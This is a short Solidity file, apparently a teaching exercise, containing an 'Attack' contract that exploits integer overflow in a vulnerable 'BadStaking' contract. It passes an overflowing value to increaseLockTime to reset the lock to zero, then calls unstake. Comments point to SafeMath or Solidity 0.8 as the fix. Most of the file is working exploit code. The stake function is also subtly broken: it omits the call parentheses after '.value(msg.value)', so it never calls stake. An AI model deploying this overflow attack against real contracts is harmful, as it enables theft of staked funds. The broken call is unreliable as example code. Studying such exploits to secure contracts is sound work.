// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7;
import "./BadStaking.sol";

//Solution: If you use under 0.8version of solidity, you should use SafeMath library
//Solution1: If you use over 0.8v, Solidity integrates SafeMath natively, so don't worry

contract Attack {
    BadStaking public stakingInstance;

    constructor(address payable _stakingInstance) public {
        stakingInstance = BadStaking(_stakingInstance);
    }

    function stake() public payable {
        stakingInstance.stake.value(msg.value);
    }

    function attack() public {
        stakingInstance.increaseLockTime(
            type(uint).max + 1 - stakingInstance.staked(address(this)).lockedUntil   // this makes the lockedTime 0, so you can unstake
        );
        stakingInstance.unstake();
    }
}